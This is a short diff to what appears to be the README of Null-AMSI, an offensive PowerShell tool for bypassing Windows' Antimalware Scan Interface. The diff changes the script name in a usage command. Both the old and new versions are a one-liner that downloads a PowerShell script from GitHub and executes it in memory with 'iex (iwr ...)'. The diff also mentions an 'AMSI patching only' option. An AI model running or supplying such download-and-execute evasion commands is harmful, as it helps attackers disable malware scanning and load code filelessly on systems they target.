@@ -40,7 +40,7 @@ To Use Null-AMSI, run the following commands:
 
 With this command we will execute Null-AMSI in memory 
 ```
-iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Invoke-NullAMSI.ps1)
+iex (iwr -UseBasicParsing https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/NullAMSI.ps1)
 ```
 For AMSI patching only
 ```
